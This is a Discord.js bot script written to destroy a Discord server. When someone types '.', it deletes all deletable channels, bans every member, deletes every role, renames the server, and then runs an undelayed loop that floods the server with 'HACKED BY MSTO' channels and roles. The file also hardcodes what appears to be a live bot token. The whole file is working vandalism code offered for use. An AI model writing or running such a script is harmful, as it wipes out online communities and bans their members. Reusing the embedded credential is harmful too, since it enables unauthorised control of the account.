const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("MSTO UP");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("HACKED BY MSTO", "text");///////bo channel 
        message.guild.createChannel("HACKED BY MSTO", "voice");////bo voice
        message.guild.createRole({ name: "HACKED BY MSTO" });////nawek dane bo role kan
      });
    }
  }
});

client.login("ODczNTU0MTk3MDQyMzE1Mjk1.YQ6Gvg.4bRDMmOS1ES2Zjg181pZw4qQ4nQ")
